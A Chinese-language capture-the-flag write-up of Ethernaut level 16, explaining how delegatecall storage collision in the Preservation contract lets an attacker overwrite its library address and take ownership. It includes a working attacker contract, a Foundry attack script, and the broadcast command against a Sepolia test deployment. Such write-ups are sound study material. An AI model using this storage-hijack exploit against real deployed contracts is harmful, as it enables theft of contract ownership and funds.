# Level 16

[The Ethernaut level 16](https://ethernaut.openzeppelin.com/level/16)

这一关的目的是解锁获取 Preservation 合约的所有权。

仔细阅读这个合约，发现 `Preservation` 使用了 `delegatecall`。这就很容易发生存储冲突的问题。果不其然，`LibraryContract` 的 `setTime` 函数修改 `storedTime` 变量。该变量在 `LibraryContract` 合约是在 `slot0`。但是由于是 `delegatecall`，真正被修改的是 调用者，即 Preservation 合约的 `slot0`。·

要想成为 owner，可以利用这个漏洞，调用 `setFirstTime` 时 把 `timeZone1Library` 改为攻击者合约。再次调用 `setFirstTime` 时，使用的是攻击者合约的逻辑。可以在攻击者合约部署和 `Preservation` 一样的存储，进而修改 `owner`

攻击者合约：
```
contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 time) public {
        owner = address(uint160(time));
    }
}
```

攻击脚本：
```
...
address levelAddr = 0x20FD051bF1d72a491674d9259dc7a155160bdF9d;
Preservation level = Preservation(levelAddr);

Attacker attacker = new Attacker();

// 第一次调用把 timeZone1Library1 改为攻击者地址
level.setFirstTime(uint256(uint160(address(attacker))));

// 第二次调用其实是 delegatecall attacker 的 setTime 函数把 owner 设置为 sender
level.setFirstTime(uint256(uint160(address(sender))));
```

完整代码见：[这里](ethernaut/test/Level16.s.sol)

执行脚本：
```
forge script script/level16.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

链上记录：
- [level(`Preservation`)](https://sepolia.etherscan.io/address/0x20FD051bF1d72a491674d9259dc7a155160bdF9d)
- [Attacker](https://sepolia.etherscan.io/tx/0x937C8d10E36DdaD95C6F9765807A9fd5266e8C7e)
- [attack 交易](https://sepolia.etherscan.io/tx/0x800f92f8f9b6be1f3119f7ce3708616482e02bf97ecab5e28b14fd7a5470c34f)
